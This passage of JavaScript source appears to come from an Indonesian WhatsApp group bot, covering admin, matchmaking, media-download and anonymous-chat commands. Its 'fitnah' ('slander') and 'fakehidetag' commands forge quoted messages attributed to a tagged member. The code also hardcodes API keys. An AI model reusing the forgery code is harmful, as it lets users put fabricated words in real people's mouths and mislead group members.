if (!isGroup) return reply(mess.group)
if (!isGroupAdmins) return reply(mess.admin)
if (!isBotGroupAdmins) return reply(mess.botAdmin)
if (groupMembers.length == 257) return reply(`Anda tidak dapat menambah peserta, karena Grup sudah penuh!`)
var mems = []
groupMembers.map( i => mems.push(i.id) )
var number;
if (args.length > 1) {
number = q.replace(/[^0-9]/gi, '')+"@s.whatsapp.net"
var cek = await ronzz.onWhatsApp(number)
if (cek.length == 0) return reply(`Masukkan nomer yang valid dan terdaftar di WhatsApp`)
if (mems.includes(number)) return reply(`Nomer tersebut sudah berada didalam grup!`)
ronzz.groupParticipantsUpdate(from, [number], "add")
.then( res => reply(`*Sukses...*`))
.catch((err) => reply(mess.error.api))
} else if (isQuotedMsg) {
number = quotedMsg.sender
var cek = await ronzz.onWhatsApp(number)
if (cek.length == 0) return reply(`Peserta tersebut sudah tidak terdaftar di WhatsApp`)
if (mems.includes(number)) return reply(`Nomer tersebut sudah berada didalam grup!`)
ronzz.groupParticipantsUpdate(from, [number], "add")
.then( res => reply(`*Sukses...*`))
.catch((err) => reply(mess.error.api))
} else {
reply(`Kirim perintah ${prefix+command} nomer atau balas pesan orang yang ingin dimasukkan`)
}
addCmd(command, 1, db_dashboard)
break

case 'kick':
if (!isGroup) return reply(mess.group)
if (!isGroupAdmins) return reply(mess.admin)
if (!isBotGroupAdmins) return reply(mess.botAdmin)
var number;
if (mentionUser.length !== 0) {
number = mentionUser[0]
ronzz.groupParticipantsUpdate(from, [number], "remove")
.then( res => reply(`*Sukses...*`))
.catch((err) => reply(mess.error.api))
} else if (isQuotedMsg) {
number = quotedMsg.sender
ronzz.groupParticipantsUpdate(from, [number], "remove")
.then( res => reply(`*Sukses...*`))
.catch((err) => reply(mess.error.api))
} else {
reply(`Tag atau balas pesan orang yang ingin dikeluarkan dari grup`)
}
addCmd(command, 1, db_dashboard)
break

case 'kicktimer':
if (!isGroup) return reply(mess.group)
if (!isGroupAdmins) return reply(mess.admin)
if (!isBotGroupAdmins) return reply(mess.botAdmin)
if (!q) return reply("Tag Orang yang ingin di kick.")
if (!q.includes('|')) return reply(`Ex : ${prefix+command} Tag Orangnya|Timer\n\nContoh :\n${prefix+command} @628817839722|10\n*Note :*\nGunakan detik, contoh : 2 Menit = 120 Detik\nJangan di kasih teks apapun di belakang detik`)
let mm = args.join(' ')
let m1 = mm.split("|")[0];
let m2 = mm.split("|")[1];
let m3 = mm.split(" ")[2];
if (m1 && !m2 && !m3) return reply(`Ex : ${prefix+command} Tag Orangnya|Timer\n\nContoh :\n${prefix+command} @628817839722|10\n*Note :*\nGunakan detik, contoh : 2 Menit = 120 Detik\nJangan di kasih teks apapun di belakang detik`)
let anu =`${m2+950}`
let anunya =`${m2+100}`
var number;
if (mentionUser.length !== 0) {
number = mentionUser[0]
if (q && m1 && m2) {
ronzz.sendMessage(from, {text:`*KICK TIMERS*\nSukses mengatur jadwal, @${number} akan terkick Dalam ${m2} Detik`},{quoted:msg}) 
setTimeout( () => {
ronzz.sendMessage(from, {text:`*KICK TIMERS*\nWaktu habis, Bye Byee!! @${number}`},{quoted:msg})
}, anunya)
setTimeout( () => {
ronzz.groupParticipantsUpdate(from, [number], "remove").then(() => reply(`*Sukses...*`)).catch(() => reply(mess.error.api))
}, anu)
}
}
addCmd(command, 1, db_dashboard)
break

case 'open':
case 'buka_grup':
if (!isGroup) return reply(mess.group)
if (!isGroupAdmins && !isOwner) return reply(mess.admin)
if (!isBotGroupAdmins) return reply(mess.botAdmin)
ronzz.groupSettingUpdate(from, 'not_announcement')
reply(`Sukses mengizinkan semua peserta dapat mengirim pesan ke grup ini`)
addCmd(command, 1, db_dashboard)
break

case 'close':
case 'tutup_grup':
if (!isGroup) return reply(mess.group)
if (!isGroupAdmins && !isOwner) return reply(mess.admin)
if (!isBotGroupAdmins) return reply(mess.botAdmin)
ronzz.groupSettingUpdate(from, 'announcement')
reply(`Sukses mengizinkan hanya admin yang dapat mengirim pesan ke grup ini`)
addCmd(command, 1, db_dashboard)
break

case 'grup': case 'group':
if (!isGroup) return reply(mess.group)
if (!isGroupAdmins && !isOwner) return reply(mess.admin)
if (!isBotGroupAdmins) return reply(mess.botAdmin)
if (isAntiLink) return reply(`antilink sudah aktif`)
if (!args[0]) return ronzz.sendMessage(from, { text: "[ *GROUP SETTING* ]\n\npilih buka atau tutup", footer: `Group : ${groupName}`, buttons: [{buttonId: `${prefix+command} y`, buttonText: {displayText: 'Open'}, type: 1}, {buttonId: `${prefix+command} n`, buttonText: {displayText: 'Close'}, type: 1}],headerType: 1 })
if (args[0] == "y") {
ronzz.groupSettingUpdate(from, 'not_announcement')
reply(`Sukses mengizinkan semua peserta dapat mengirim pesan ke grup ini`)
}
if (args[0] == "n") {
ronzz.groupSettingUpdate(from, 'announcement')
reply(`Sukses mengizinkan hanya admin yang dapat mengirim pesan ke grup ini`)
}
addCmd(command, 1, db_dashboard)
break

case 'tagall':
if (!isGroup) return reply(mess.group)
if (!isGroupAdmins && !isOwner) return reply(mess.admin)
if (!q) return reply(`Teks?`)
let teks_tagall = `══✪〘 *👥 Tag All* 〙✪══\n\n${q ? q : 'Tidak Ada Pesan'}\n`
for (let mem of participants) {
teks_tagall += `➲ @${mem.id.split('@')[0]}\n`
}
ronzz.sendMessage(from, { text: teks_tagall, mentions: participants.map(a => a.id) }, { quoted: msg })
addCmd(command, 1, db_dashboard)
break

case 'fitnah':{
if (cekUser("id", sender) == null) return sendMessRegis(from)
if (!isGroup) return reply(mess.group)
if (!q) return reply(`Kirim perintah *${prefix+command}* @tag|pesantarget|pesanbot`)
var org = q.split('|')[0] ? q.split('|')[0] : q
var target = q.split('|')[1] ? q.split('|')[1] : q
var bot = q.split('|')[2] ? q.split('|')[2] : ''
if (bot.length <1) return reply(`Kirim perintah *${prefix+command}* @tag|pesantarget|pesanbot`)
if (!org.startsWith('@')) return reply('Tag orangnya')
if (!target) return reply(`Masukkan pesan target!`)
if (!bot) return reply(`Masukkan pesan bot!`)
var mens = parseMention(target)
var msg1 = { key: { fromMe: false, participant: `${parseMention(org)}`, remoteJid: from ? from : '' }, message: { extemdedTextMessage: { text: `${target}`, contextInfo: { mentionedJid: mens }}}}
var msg2 = { key: { fromMe: false, participant: `${parseMention(org)}`, remoteJid: from ? from : '' }, message: { conversation: `${target}` }}
ronzz.sendMessage(from, { text: bot, mentions: mentioned }, { quoted: mens.length > 2 ? msg1 : msg2 })
}
addCmd(command, 1, db_dashboard)
break

case 'delete':
if (!isGroup) return reply(mess.group)
if (!isGroupAdmins && !isOwner) return reply(mess.admin)
if (!isQuotedMsg) return reply(`Reply chat dari bot yang ingin dihapus`)
if (!quotedMsg.fromMe) return reply(`Hanya bisa menghapus chat dari bot`)
ronzz.sendMessage(from, { delete: { fromMe: true, id: quotedMsg.id, remoteJid: from }})
addCmd(command, 1, db_dashboard)
break

case 'jodoh': {
if (cekUser("id", sender) == null) return sendMessRegis(from)
if (!isGroup) return reply(mess.group)
let member = participants.map(u => u.id)
let me = sender
let jodoh = member[Math.floor(Math.random() * member.length)]
let jawab = `??Jodoh mu adalah

@${me.split('@')[0]} ❤ @${jodoh.split('@')[0]}`
let ments = [me, jodoh]
let buttons = [
{ buttonId: prefix+'jodohku', buttonText: { displayText: 'Cari Lagi' }, type: 1 }
]
await sendButtonText(from, buttons, jawab, footer, msg, {mentions: ments})
}
addCmd(command, 1, db_dashboard)
break

case 'jadian': {
if (cekUser("id", sender) == null) return sendMessRegis(from)
if (!isGroup) return reply(mess.group)
let member = participants.map(u => u.id)
let orang = member[Math.floor(Math.random() * member.length)]
let jodoh = member[Math.floor(Math.random() * member.length)]
let jawab = `Ciee yang Jadian💖 Jangan lupa pajak jadiannya🐤

@${orang.split('@')[0]} ❤ @${jodoh.split('@')[0]}`
let menst = [orang, jodoh]
let buttons = [
{ buttonId: prefix+'jadian', buttonText: { displayText: 'Cari Lagi' }, type: 1 }
]
await sendButtonText(from, buttons, jawab, footer, msg, {mentions: menst})
}
addCmd(command, 1, db_dashboard)
break

case 'revoke':
if (!isGroup) return reply(mess.group)
if (!isGroupAdmins) return reply(mess.admin)
if (!isBotGroupAdmins) return reply(mess.botAdmin)
await ronzz.groupRevokeInvite(from)
.then( res => {
reply(`Sukses menyetel tautan undangan grup ini`)
}).catch(() => reply(mess.error.api))
addCmd(command, 1, db_dashboard)
break

case 'antilink':{
if (!isGroup) return reply(mess.group)
if (!isGroupAdmins && !isOwner) return reply(mess.admin)
if (!isBotGroupAdmins) return reply(mess.botAdmin)
if (isAntiLink) return reply(`antilink sudah aktif`)
if (!args[0]) return ronzz.sendMessage(from, { text: "[ *ANTILINK* ]\n\npilih on atau off", footer: 'setting antilink.', buttons: [{buttonId: `${prefix+command} on`, buttonText: {displayText: 'on'}, type: 1}, {buttonId: `${prefix+command} off`, buttonText: {displayText: 'off'}, type: 1}],headerType: 1 })
if (args[0] == "on") {
if (isAntiLink) return reply(`antilink sudah aktif`)
antilink.push(from)
fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink, null, 2))
reply('Successfull Activate Antilink In This Group')}
if (args[0] == "off") {
if (!isAntiLink) return reply(`antilink telah mati`)
let anu = antilink.indexOf(from)
antilink.splice(anu, 1)
fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink, null, 2))
reply('Successfull Disabling Antilink In This Group')
}
}
addCmd(command, 1, db_dashboard)
break

case 'welcome':
if (!isGroup) return reply(mess.group)
if (!isGroupAdmins && !isOwner) return reply(mess.admin)
if (!args[0]) return ronzz.sendMessage(from, { text: "[ *FITUR WELCOME* ]\n\nPilih di bawah ini", footer: 'klik button..', buttons: [{buttonId: `${prefix + command} on`, buttonText: {displayText: 'ON'}, type: 1}, {buttonId: `${prefix + command} off`, buttonText: {displayText: 'OFF'}, type: 1}],headerType: 1 })
if (args[0] == "on") {
if (isWelcome) return reply(`Welcome sudah aktif`)
welcome.push(from)
fs.writeFileSync('./database/welcome.json', JSON.stringify(welcome, null, 2))
reply(`Sukses mengaktifkan welcome di grup ini`)
}
if (args[0] == "off") {
if (!isWelcome) return reply(`Welcome sudah dimatikan`)
var posi = welcome.indexOf(from)
welcome.splice(posi, 1)
fs.writeFileSync('./database/welcome.json', JSON.stringify(welcome, null, 2))
reply(`Sukses menonaktifkan welcome di grup ini`)
}
addCmd(command, 1, db_dashboard)
break

case 'left':
if (!isGroup) return reply(mess.group)
if (!isGroupAdmins && !isOwner) return reply(mess.admin)
if (!args[0]) return ronzz.sendMessage(from, { text: "[ *FITUR LEFT* ]\n\nPilih di bawah ini", footer: 'klik button..', buttons: [{buttonId: `${prefix + command} on`, buttonText: {displayText: 'ON'}, type: 1}, {buttonId: `${prefix + command} off`, buttonText: {displayText: 'OFF'}, type: 1}],headerType: 1 })
if (args[0] == "on") {
if (isLeft) return reply(`Left sudah aktif`)
welcome.push(from)
fs.writeFileSync('./database/welcome.json', JSON.stringify(welcome, null, 2))
reply(`Sukses mengaktifkan left di grup ini`)
}
if (args[0] == "off") {
if (!isLeft) return reply(`Left sudah dimatikan`)
var posi = welcome.indexOf(from)
welcome.splice(posi, 1)
fs.writeFileSync('./database/welcome.json', JSON.stringify(welcome, null, 2))
reply(`Sukses menonaktifkan left di grup ini`)
}
addCmd(command, 1, db_dashboard)
break

case 'hidetag':{
if (cekUser("id", sender) == null) return sendMessRegis(from)
if (!isGroup) return reply(mess.group)
if (!isGroupAdmins && !isOwner) return reply(mess.admin)
let mem = [];
groupMembers.map( i => mem.push(i.id) )
ronzz.sendMessage(from, { text: q ? q : '', mentions: mem })
}
addCmd(command, 1, db_dashboard)
break

case 'demote':
if (!isGroup) return reply(mess.group)
if (!isGroupAdmins) return reply(mess.admin)
if (!isBotGroupAdmins) return reply(mess.botAdmin)
if (mentionUser.length !== 0) {
ronzz.groupParticipantsUpdate(from, [mentionUser[0]], "demote")
.then( res => { mentions(`Sukses menjadikan @${mentionUser[0].split("@")[0]} sebagai member biasa`, [mentionUser[0]], true) })
.catch(() => reply(mess.error.api))
} else if (isQuotedMsg) {
ronzz.groupParticipantsUpdate(from, [quotedMsg.sender], "demote")
.then( res => { mentions(`Sukses menjadikan @${quotedMsg.sender.split("@")[0]} sebagai member biasa`, [quotedMsg.sender], true) })
.catch(() => reply(mess.error.api))
} else {
reply(`Tag atau balas pesan admin yang ingin dijadikan member biasa`)
}
addCmd(command, 1, db_dashboard)
break

case 'setdesc':
if (!isGroup) return reply(mess.group)
if (!isGroupAdmins && !isOwner) return reply(mess.admin)
if (!isBotGroupAdmins) return reply(mess.botAdmin)
if (!q) return reply(`Gunakan dengan cara ${prefix+command} *text*\n\n_Contoh_\n\n${prefix+command} New Description by ${ownerName}`)
await ronzz.groupUpdateDescription(from, q)
.then( res => {
reply(`Sukses`)
}).catch(() => reply(mess.error.api))
addCmd(command, 1, db_dashboard)
break

case 'linkgrup': case 'linkgc':
if (!isGroup) return reply(mess.group)
if (!isBotGroupAdmins) return reply(mess.botAdmin)
var url = await ronzz.groupInviteCode(from).catch(() => reply(mess.error.api))
url = 'https://chat.whatsapp.com/'+url
reply(url)
addCmd(command, 1, db_dashboard)
break

case 'promote':
if (!isGroup) return reply(mess.group)
if (!isGroupAdmins) return reply(mess.admin)
if (!isBotGroupAdmins) return reply(mess.botAdmin)
if (mentionUser.length !== 0) {
ronzz.groupParticipantsUpdate(from, [mentionUser[0]], "promote")
.then( res => { mentions(`Sukses menjadikan @${mentionUser[0].split("@")[0]} sebagai admin`, [mentionUser[0]], true) })
.catch(() => reply(mess.error.api))
} else if (isQuotedMsg) {
ronzz.groupParticipantsUpdate(from, [quotedMsg.sender], "promote")
.then( res => { mentions(`Sukses menjadikan @${quotedMsg.sender.split("@")[0]} sebagai admin`, [quotedMsg.sender], true) })
.catch(() => reply(mess.error.api))
} else {
reply(`Tag atau balas pesan member yang ingin dijadikan admin`)
}
addCmd(command, 1, db_dashboard)
break

case 'setppgrup': case 'setppgc':
if (!isGroup) return reply(mess.group)
if (!isGroupAdmins && !isOwner) return reply(mess.admin)
if (!isBotGroupAdmins) return reply(mess.botAdmin)
if (isImage || isQuotedImage) {
var media = await downloadAndSaveMediaMessage('image', `ppgc${from}.jpeg`)
if (args[1] == "panjang") {
var { img } = await generateProfilePicture(media)
await ronzz.query({ tag: 'iq', attrs: { to: from, type:'set', xmlns: 'w:profile:picture' },
content: [{ tag: 'picture', attrs: { type: 'image' }, content: img }] })
fs.unlinkSync(media)
reply(`Sukses`)
} else {
var data = await ronzz.updateProfilePicture(from, { url: media })
fs.unlinkSync(media)
reply(`Sukses`)
}
} else {
reply(`Kirim/balas gambar dengan caption ${prefix+command} untuk mengubah foto profil grup`)
}
addCmd(command, 1, db_dashboard)
break

case 'fakehidetag': {
if (cekUser("id", sender) == null) return sendMessRegis(from)
if (!isGroup) return reply(mess.group)
if (args.length < 2) return reply(`Kirim perintah *${prefix+command}* @tag|teks`)
var org = q.split("|")[0]
var teks = q.split("|")[1];
if (!org.startsWith('@')) return reply('Tag orangnya')
var mem2 = []
groupMembers.map( i => mem2.push(i.id) )
var mens = parseMention(target)
var msg1 = { key: { fromMe: false, participant: `${parseMention(org)}`, remoteJid: from ? from : '' }, message: { extemdedTextMessage: { text: `${prefix}hidetag ${teks}`, contextInfo: { mentionedJid: mens }}}}
var msg2 = { key: { fromMe: false, participant: `${parseMention(org)}`, remoteJid: from ? from : '' }, message: { conversation: `${prefix}hidetag ${teks}` }}
ronzz.sendMessage(from, { text: teks ? teks : '', mentions: mem2 }, { quoted: mens.length > 2 ? msg1 : msg2 })
}
addCmd(command, 1, db_dashboard)
break

case 'tiktok':
case 'tiktokmp4':{
if (cekUser("id", sender) == null) return sendMessRegis(from)
if (!q) return reply(`*Silahkan kirim link/url videonya.*`)
let video_tt = await fdl.downloader.tiktok(q)
let teksnya = "*TIK TOK DOWNLOADER*\n"
teksnya += `*Judul:* ${video_tt.title}\n`
teksnya += `*Author:* ${video_tt.author}\n`
teksnya += `*Type:* mp4/video\n`
teksnya += `*Creator:* Ronzz YT\n\n`
teksnya += `Kamu bisa mengambil audio nya\n`
teksnya += `Dengan cara di bawah ini!!\n\n`
teksnya += `${prefix}tiktokmp3 ${q}`
if (!isGroup) {
reply(mess.wait)
}
ronzz.sendMessage(from, { video: { url: video_tt.nowm }, caption: teksnya, footer: `${botName} © 2022`}, { quoted: fkontak })
if (isGroup) {
reply("Media sedang dikirim di private chat")
}
}
break

case 'tiktokmp3':{
if (cekUser("id", sender) == null) return sendMessRegis(from)
if (!q) return reply(`Ex : ${prefix+command} Link\n\nContoh :\n${prefix+command} https://vt.tiktok.com/ZSRC89VPd/`)
let audio_tt = await fdl.downloader.tiktok(q)
let cp_ttmp3 = "*TIKTOK DOWNLOAD*\n"
cp_ttmp3 += `*Judul:* ${audio_tt.title}\n`
cp_ttmp3 += `*Author:* ${audio_tt.author}\n`
cp_ttmp3 += `*Type:* mp3/audio\n`
cp_ttmp3 += `*Creator:* Ronzz YT\n\n`
cp_ttmp3 += "Kamu bisa mengambil video nya\n"
cp_ttmp3 += "Dengan cara di bawah ini!!\n\n"
cp_ttmp3 += `${prefix}tiktokmp4 ${q}`
reply(mess.wait)
if (!isGroup) {
reply(mess.wait)
}
ronzz.sendMessage(sender, { text: cp_ttmp3, footer: `${botName} © 2022` }, { quoted: fkontak })
ronzz.sendMessage(sender, { audio: { url: audio_tt.audio }, mimetype: 'audio/mpeg' }, { quoted: fkontak })
if (isGroup) {
reply("Media sedang dikirim di private chat")
}
}
break

case 'ytmp4':
case 'ytvideo': {
if (cekUser("id", sender) == null) return sendMessRegis(from)
if (!q) return reply(`Ex : ${prefix+command} Link\n\nContoh\n${prefix + command} https://youtu.be/ZJRuLQjkPmw`)
let result = await fetchJson(`https://danzzapi.xyz/api/downloader/ytmp4?url=${q}&apikey=danzz`)
if (!isGroup) {
reply(mess.wait)
}
ronzz.sendMessage(sender, { video: { url: result.result.url }, mimetype: 'video/mp4', fileName: `${result.result.title}.mp4`, caption: `⭔Title : ${result.result.title}\n⭔Channel : ${result.result.channel}\n⭔Published : ${result.result.published}\n⭔View : ${result.result.views}\n⭔Url : ${q}\n`}, { quoted: fkontak })
if (isGroup) {
reply("Media sedang dikirim di private chat")
}
}
break

case 'ytmp3':
case 'ytaudio': {
if (cekUser("id", sender) == null) return sendMessRegis(from)
if (!q) return reply(`Ex : ${prefix+command} Link\n\nContoh\n${prefix + command} https://youtu.be/ZJRuLQjkPmw`)
let result = await fetchJson(`https://danzzapi.xyz/api/downloader/ytmp3?url=${q}&apikey=danzz`)
ronzz.sendMessage(sender, { audio: { url: result.result.url }, mimetype: 'audio/mpeg', fileName: `${result.result.title}.mp3`}, { quoted: fkontak })
if (isGroup) {
reply("Media sedang dikirim di private chat")
}
}
break

case 'mediafire':{
if (cekUser("id", sender) == null) return sendMessRegis(from)
if (!q) return reply(`Ex : ${prefix+command} Link\n\nContoh :\n${prefix+command} https://www.mediafire.com/file/4jzmc4boquizy0n/HAPUS_CONFIG_FF_MAX.7z/file`)
if (!/^https?:\/\/www.mediafire.com/.test(q)) return reply(`Link tidak valid\nLink yang valid seperti dibawah ini\nhttps://www.mediafire.com/file/4jzmc4boquizy0n/HAPUS_CONFIG_FF_MAX.7z/file`)
let { mediafireDl } = require('./lib/mediafire')
let link_nya = q
const result_mediafire = await mediafireDl(link_nya)
let text_mediafire = "*MEDIAFIRE DOWNLOAD*\n"
text_mediafire += `Judul : ${result_mediafire[0].nama}\n`
text_mediafire += `Type : ${result_mediafire[0].mime}\n`
text_mediafire += `Size : ${result_mediafire[0].size}\n`
text_mediafire += `Link : ${result_mediafire[0].link}\n\n`
text_mediafire += "_Sedang mengirim file._"
if (!isGroup) {
reply(mess.wait)
}
ronzz.sendMessage(sender, { text: text_mediafire, footer: `${botName} © 2022`}, { quoted: fkontak })
ronzz.sendMessage(sender, { document : { url : result_mediafire[0].link}, fileName : result_mediafire[0].nama, mimetype: result_mediafire[0].mime }, { quoted: fkontak })
if (isGroup) {
reply("Media sedang dikirim di private chat")
}
}
addCmd(command, 1, db_dashboard)
break

case 'cuaca':{
if (cekUser("id", sender) == null) return sendMessRegis(from)
if (!q) return reply(`Ex : ${prefix+command} Daerah\n\nContoh :\n${prefix+command} Cirebon`)
let api_cuaca = '18d044eb8e1c06eaf7c5a27bb138694c'
let unit_cuaca = 'metric'
let nama_kota = q
let cuaca = await fetchJson(`http://api.openweathermap.org/data/2.5/weather?q=${nama_kota}&units=${unit_cuaca}&appid=${api_cuaca}`)
let text_cuaca =`*INFO CUACA*
Nama: ${cuaca.name + "," + cuaca.sys.country}
Longitude: ${cuaca.coord.lon}
Latitude: ${cuaca.coord.lat}
Suhu: ${cuaca.main.temp + " C"}
Angin: ${cuaca.wind.speed + " m/s"}
Kelembaban: ${cuaca.main.humidity + "%"}
Cuaca: ${cuaca.weather[0].main}
Keterangan: ${cuaca.weather[0].description}
Udara: ${cuaca.main.pressure + " HPa"}`
reply(text_cuaca)
}
addCmd(command, 1, db_dashboard)
break

case 'pinterest':{
if (cekUser("id", sender) == null) return sendMessRegis(from)
if (!q) return reply(`Ex : ${prefix+command} Yang Ingin Di Cari\n\nContoh :\n${prefix+command} Killua`)
reply(mess.wait)
let anu = await pinterest(q)
let result = anu[Math.floor(Math.random(), anu.length)]
let gam = await getBuffer(result)
ronzz.sendMessage(from, { image: gam, caption: `⭔Query : ${q}\n⭔Url : ${result}` }, { quoted: msg })
}
addCmd(command, 1, db_dashboard)
break

case 'wallpaper':{
if (cekUser("id", sender) == null) return sendMessRegis(from)
if (!q) return reply(`Ex : ${prefix+command} Wallpaper\n\nContoh :\n${prefix+command} Killua`)
reply(mess.wait)
wallpaper(q).then( async anu =>{
let result = anu[Math.floor(Math.random(), anu.length)]
let gam = await getBuffer(result.image[0])
ronzz.sendMessage(from, { image: gam, caption: `⭔Title : ${result.title}\n⭔Source : ${result.source}\n⭔Media Url : ${result.image}` }, { quoted: msg })
})
}
addCmd(command, 1, db_dashboard)
break

case 'play':{
if (cekUser("id", sender) == null) return sendMessRegis(from)
if (!q) return reply(`Contoh : ${prefix + command} preset angel baby 30 detik`)
let yts = require("yt-search")
let search = await yts(q)
let anu = search.videos[Math.floor(Math.random() * search.videos.length)]
let button_play = [
{ buttonId: `${prefix}ytmp3 ${anu.url}`, buttonText: { displayText: "Video" }, type: 1 },
{ buttonId: `${prefix}ytmp4 ${anu.url}`, buttonText: { displayText: "Audio" }, type: 1 }
]
let text_play =`*YOUTUBE PLAY*
⭔Title : ${anu.title}
⭔Ext : Search
⭔ID : ${anu.videoId}
⭔Duration : ${anu.timestamp}
⭔Viewers : ${anu.views}
⭔Upload At : ${anu.ago}
⭔Author : ${anu.author.name}
⭔Channel : ${anu.author.url}
⭔Description : ${anu.description}
⭔Url : ${anu.url}`
const ini_message_Play = {
image: await getBuffer(anu.thumbnail),
caption: text_play,
footer: 'Pilih media di bawah ini.',
buttons: button_play,
headerType: 4
}
reply(mess.wait)
const sendPlay = await ronzz.sendMessage(from, ini_message_Play, { quoted: msg })
}
addCmd(command, 1, db_dashboard)
break

case 'happymod': {
if (cekUser("id", sender) == null) return sendMessRegis(from)
if (!q) return reply(`Example : ${prefix+command} mobile legend`)
yogipw.happymod(q).then(async(res) => {
teks = '```「 HappyMod Search 」```'
for (let i of res) {
teks += `\n\n${i.name}\n`
teks += `${i.link}`
}
reply(teks)
})
}
break

case 'mcpedl': {
if (cekUser("id", sender) == null) return sendMessRegis(from)
if (!q) return reply(`Ex : ${prefix+command} Yang Ingin Di Cari\n\nContoh :\n${prefix+command} Shader`)
yogipw.mcpedl(q).then(async(res) => {
teks = `*| MCPEDL SEARCH |*`
for (let i of res) {
teks += `\n\nName : ${i.name}\nCategory : ${i.category}\nDate : ${i.date}\nDesc : ${i.desc}\nLink : ${i.link}`
}
reply(teks)
})
}
addCmd(command, 1, db_dashboard)
break

case 'komikku':
case 'komiku':{
if (cekUser("id", sender) == null) return sendMessRegis(from)
if (!q) return reply(`Ex : ${prefix+command} Judul Komik\n\nContoh :\n${prefix+command} Attack On Titan`)
reply(mess.wait)
komiku(q).then(async anu =>{
let result = anu[Math.floor(Math.random(), anu.length)]
let gam = await getBuffer(result.image)
ronzz.sendMessage(from, { location: { jpegThumbnail: await reSize(gam, 300, 150) }, caption: `⭔Title : ${result.title}\n⭔Indo : ${result.indo}\n⭔Update : ${result.update}\n⭔Deskripsi : ${result.desc}\n⭔Chapter Awal : ${result.chapter_awal}\n⭔Chapter Akhir : ${result.chapter_akhir}\n⭔Link : ${result.link}`, footer: `${botName} © 2022` }, { quoted: msg })
}) 
}
addCmd(command, 1, db_dashboard)
break

case 'start': case 'search':{
if (cekUser("id", sender) == null) return sendMessRegis(from)
if (isGroup) return reply(mess.private)
var rumss = Object.values(anonymous).find(room => anonyCheck(sender, room))
var rooms = Object.values(anonymous).find(room => anonyCheck(sender, room) && room.state == 'CHATTING')
if (rooms) {
var but = [
{ buttonId: prefix+'stop', buttonText: { displayText: "❌ STOP ❌" }, type: 1 },
{ buttonId: prefix+'skip', buttonText: { displayText: "⏩ SKIP ⏩" }, type: 1 },
{ buttonId: prefix+'sendprofil', buttonText: { displayText: "🗣️ SEND PROFIL 🗣️" }, type: 1 }
]
var teks = `[⚠️] Kamu masih dalam sesi chat dengan partner! ❌`
return ronzz.sendMessage(from, { text: teks, footer: `${botName} © 2022`, buttons: but })
} else if (rumss) {
var teks = `[🔎] Mohon tunggu sedang mencari teman chat`
var but = [ { buttonId: prefix+'stop', buttonText: { displayText: "❌ STOP ❌" }, type: 1 } ]
return ronzz.sendMessage(from, { text: teks, footer: `${botName} © 2022`, buttons: but })
}
var roomm = Object.values(anonymous).find(room => room.state == "WAITING" && !anonyCheck(sender, room))
if (roomm) {
var but = [
{ buttonId: prefix+'stop', buttonText: { displayText: "❌ STOP ❌" }, type: 1 },
{ buttonId: prefix+'skip', buttonText: { displayText: "⏩ SKIP ⏩" }, type: 1 },
{ buttonId: prefix+'sendprofil', buttonText: { displayText: "🗣️ SEND PROFIL 🗣️" }, type: 1 }
]
roomm.b = sender
roomm.state = "CHATTING"
var teks = `_Pasangan Ditemukan 🐼_\n_Coba Katakan Halo / Pesan Lainnya_\n${prefix}skip -- _Cari pasangan baru_\n${prefix}stop -- _Hentikan dialog ini_`
await ronzz.sendMessage(roomm.a, { text: teks, footer: `${botName} © 2022`, buttons: but })
await ronzz.sendMessage(roomm.b, { text: teks, footer: `${botName} © 2022`, buttons: but })
} else if (!rooms) {
let id = + new Date
anonymous[id] = {
id,
a: sender,
b: '',
state: "WAITING"
}
var but = [
{ buttonId: prefix+'stop', buttonText: { displayText: "❌ STOP ❌" }, type: 1 }
]
var teks = `[🔎] Mohon tunggu sedang mencari teman chat`
await ronzz.sendMessage(from, { text: teks, footer: `${botName} © 2022`, buttons: but })
}
}
break

case 'stop':{
if (cekUser("id", sender) == null) return sendMessRegis(from)
if (isGroup) return reply(mess.private)
var roomo = Object.values(anonymous).find(room => anonyCheck(sender, room))
if (!roomo) {
var but = [
  { buttonId: prefix+'start', buttonText: { displayText: "🔎 SEARCH 🔎" }, type: 1 }
]
var teks = `[⚠️] Kamu belum pernah mulai chat! ❌`
await ronzz.sendMessage(from, { text: teks, footer: `${botName} © 2022`, buttons: but })
} else {
var but = [
  { buttonId: prefix+'start', buttonText: { displayText: "🔎 SEARCH 🔎" }, type: 1 }
]
var teks = `[✅] Berhasil memberhentikan chat`
var teks2 = `[⚠️] Sesi chat ini telah diberhentikan oleh teman chat kamu`
await ronzz.sendMessage(from, { text: teks, footer: `${botName} © 2022`, buttons: but })
let other = anonyOther(sender, roomo)
if (other) await ronzz.sendMessage(other, { text: teks2, footer: `${botName} © 2022`, buttons: but })
delete anonymous[roomo.id]
}
}
break

case 'next': case 'skip':{
if (cekUser("id", sender) == null) return sendMessRegis(from)
if (isGroup) return reply(mess.private)
let romeo = Object.values(anonymous).find(room => anonyCheck(sender, room))
var but = [
{ buttonId: prefix+'start', buttonText: { displayText: "🔎 SEARCH 🔎" }, type: 1 }
]
if (!romeo) {
var teks = `[⚠️] Kamu belum pernah memulai chat! ❌`
return await ronzz.sendMessage(from, { text: teks, footer: `${botName} © 2022`, buttons: but })
} else {
let other = anonyOther(sender, romeo)
var teks1 = `[⚠️] Sesi chat ini telah diberhentikan oleh teman chat kamu! ❌`
if (other) await ronzz.sendMessage(other, { text: teks1, footer: `${botName} © 2022`, buttons: but })
delete anonymous[romeo.id]
}
let room = Object.values(anonymous).find(room => room.state == "WAITING" && !anonyCheck(sender, room))
if (room) {
var but = [
  { buttonId: prefix+'stop', buttonText: { displayText: "❌ STOP ❌" }, type: 1 },
  { buttonId: prefix+'skip', buttonText: { displayText: "⏩ SKIP ⏩" }, type: 1 },
  { buttonId: prefix+'sendprofil', buttonText: { displayText: "🗣️ SEND PROFIL 🗣️" }, type: 1 }
]
room.b = sender
room.state = "CHATTING"
var teks = `_Pasangan Ditemukan 🐼_\n_Coba Katakan Halo / Pesan Lainnya_\n${prefix}skip -- _Cari pasangan baru_\n${prefix}stop -- _Hentikan dialog ini_`
await ronzz.sendMessage(room.a, { text: teks, footer: `${botName} © 2022`, buttons: but })
await ronzz.sendMessage(room.b, { text: teks, footer: `${botName} © 2022`, buttons: but })
} else {
let id = + new Date
anonymous[id] = {
    id,
    a: sender,
    b: '',
    state: "WAITING"
}
var but = [
  { buttonId: prefix+'stop', buttonText: { displayText: "❌ STOP ❌" }, type: 1 }
]
var teks = `[🔎] Mohon tunggu sedang mencari teman chat`
await ronzz.sendMessage(from, { text: teks, footer: `${botName} © 2022`, buttons: but })
}
}
break

case 'sendprofile': case 'sendprofil':{
